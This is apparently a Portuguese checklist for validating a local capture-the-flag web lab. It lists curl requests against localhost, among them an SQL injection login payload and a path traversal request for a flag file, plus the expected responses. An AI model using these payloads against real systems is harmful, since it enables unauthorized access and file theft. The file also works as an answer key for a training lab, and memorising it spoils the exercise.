# Validacao do Release Candidate

Comandos esperados para validar o `web-basic-01`.

```bash
cd ~/ctf-labs
grep -Rho "FLAG{[^}]*}" web-basic-01 | sort -u
```

```bash
cd ~/ctf-labs/web-basic-01
sudo docker compose up --build
```

```bash
curl -i http://localhost:8088
curl -i http://localhost:8088/status
curl -i http://localhost:8088/robots.txt
curl -i http://localhost:8088/dev.txt
curl -i -X POST http://127.0.0.1:8088/login -d "username=naoexiste" -d "password=teste"
curl -i -X POST http://127.0.0.1:8088/login -d "username=joao" -d "password=errada"
curl -i -c cookies.txt -X POST http://127.0.0.1:8088/login -d "username=admin' OR '1'='1' -- " -d "password=teste"
curl -i "http://localhost:8088/download?file=public-info.txt"
curl -i "http://localhost:8088/download?file=../../../../flags/final.txt"
```

Resultados esperados para o login:

- usuario inexistente: `Usuario nao encontrado.`
- usuario existente com senha errada: `Senha invalida.`
- SQL Injection: `302 Found` com `Location: /dashboard`
